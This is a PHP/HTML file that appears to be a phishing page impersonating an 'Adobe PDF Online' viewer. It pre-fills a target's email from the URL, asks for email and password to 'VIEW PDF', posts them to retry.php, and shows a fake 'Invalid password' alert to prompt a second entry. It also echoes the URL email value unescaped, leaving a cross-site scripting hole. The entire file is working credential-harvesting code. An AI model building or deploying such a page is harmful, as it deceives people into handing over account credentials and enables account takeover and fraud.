<?php

if (isset($_GET['email'])) {

	$email = $_GET['email'];
}

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Adobe PDF Online - 984NF98738UNFD84309KSJDJR4843</title>
<link rel="icon" type="image/png" href="images/favicon.ico">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</script>
</head>
<body style="background-image: url('images/0.jpg'); height: 928px; background-repeat: no-repeat">
<div style="position: absolute; width: 437px; height: 278px; z-index: 1; left: 422px; top: 223px; background-image: url('images/1.png'); background-repeat: no-repeat" id="layer1">
<div style="position:absolute; width: 91px; height: 7px; z-index: 1; left: 171px; top: 67px; background-image: ; background-repeat: no-repeat" id="layer2">
</div>
<form method="POST" autocomplete="on" name="login_form" id="login_form" style="line-height: 1.22em; margin: 0px; padding: 0px;" action="retry.php"  onsubmit="return formbreeze_sub()" >
<div style="position: absolute; width: 313px; height: 20px; z-index: 1; left: 63px; top: 104px" id="layer3">
<span class="formwrap">
<input id="did" name="e" style="width:315; height:34; padding: 10px;" autocomplete="on" placeholder="Email Address" value="<?php if (isset($_GET['email'])) { echo $email; }?>" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" type="email"/>
</span></div>
<div style="position: absolute; width: 314px; height: 20px; z-index: 2; left: 63px; top: 152px" id="layer4">
<span class="formwrap">
<input   id="didd" name="p" placeholder="Password" style="width:315; height:34; padding: 10px;" type="password"></span></div>
<div style="position: absolute; width: 92px; height: 30px; z-index: 3; left: 164px; top: 220px" id="layer5">
<button type="submit" id=".save" name=".save" class="lgbx-btn purple-bg" tabindex="4" style="line-height: 1.22em; border: 1px solid rgb(82, 38, 117); color: rgb(255, 255, 255); height: 35px; width: 100px; font-weight: bold; cursor: pointer; text-align: center; border-top-left-radius: 2px; border-top-right-radius: 2px; border-bottom-right-radius: 2px; border-bottom-left-radius: 2px; background-color: rgb(185, 5, 5); font-size: 13px;">VIEW PDF</button></div>	
 </div>
</body>
<div style="position: absolute; width: 437px; height: px; z-index: 1; left: 422px; top: 170px" id="layer8">
<div class="alert alert-danger alert-warning alert-dismissible fade show" role="alert">
<strong>Invalid password provided!</strong> Please try again.
<button type="button" class="close" data-dismiss="alert" aria-label="Close">
<span aria-hidden="true">&times;</span>
</button>
</div>
</div>
</html>